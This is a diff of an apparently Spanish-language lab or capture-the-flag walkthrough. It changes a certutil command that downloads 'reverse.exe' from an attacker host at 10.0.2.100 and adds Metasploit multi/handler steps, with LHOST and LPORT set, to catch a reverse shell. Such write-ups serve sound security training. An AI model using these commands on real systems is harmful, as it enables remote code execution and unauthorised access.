@@ -292,5 +292,18 @@ python3 - http.server 80
 Nos movemos a Public/Downloads para obtener el archivo.
 
 ```bash
-certutil.exe -f urlcache http://10.0.2.100/reverse.exe
+certutil.exe -f urlcache http://10.0.2.100/reverse.exe reverse.exe
+```
+
+> Nota: en Linux es como el directorio /tmp
+
+Abrimos Metasploit.
+
+```bash
+msfconsole
+search multi/handler
+use multi/handler
+show options
+set LHOST 10.0.2.100
+set LPORT 443
 ```
